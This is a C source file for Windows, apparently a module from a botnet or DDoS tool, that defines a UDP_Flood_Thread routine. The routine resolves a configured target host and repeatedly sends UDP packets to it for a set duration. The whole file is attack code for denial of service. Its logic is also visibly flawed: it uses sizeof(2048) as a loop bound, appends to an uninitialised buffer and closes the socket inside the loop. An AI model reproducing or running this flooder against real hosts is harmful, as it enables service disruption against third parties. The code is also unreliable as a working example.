#include "wALL.h"
//#include "Globals.h"

DWORD WINAPI UDP_Flood_Thread( LPVOID param )
{
	char szBuffer[2048];
//	DWORD dwTime;

	int i = 0;
	int iEndTime = 0;

	sockaddr_in sin;
	SOCKET _sock;

	if( !gethostbyname( szUDP_Host ) ) {
			return 0;
	}

	sin.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)szUDP_Host)->h_addr_list[0];
	sin.sin_family = AF_INET;
	sin.sin_port = htons( szUDP_Port );
	_sock = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP );

	if( _sock == SOCKET_ERROR ) {
			return 0;
	}

	srand( GetTickCount() );
	
	for( i = 0; i < sizeof( 2048 ) - 3; i++ ) {

		szBuffer[i] = rand() % 9;
		strncat( szBuffer, "\r", sizeof( szBuffer ) - strlen( szBuffer ) - 1 );
		strncat( szBuffer, "\n", sizeof( szBuffer ) - strlen( szBuffer ) - 1 );

		iEndTime = ( GetTickCount() + ( szUDP_Time * 1000 ) );

		while( TRUE ) {
				sendto( _sock, szBuffer, strlen( szBuffer ), 0, (sockaddr *)&sin, sizeof( sin ) );

				if( (signed int)GetTickCount() >= iEndTime ) {
					break;
				}

				Sleep( szUDP_Delay );
		}
		closesocket( _sock );
	}
	return 0;
}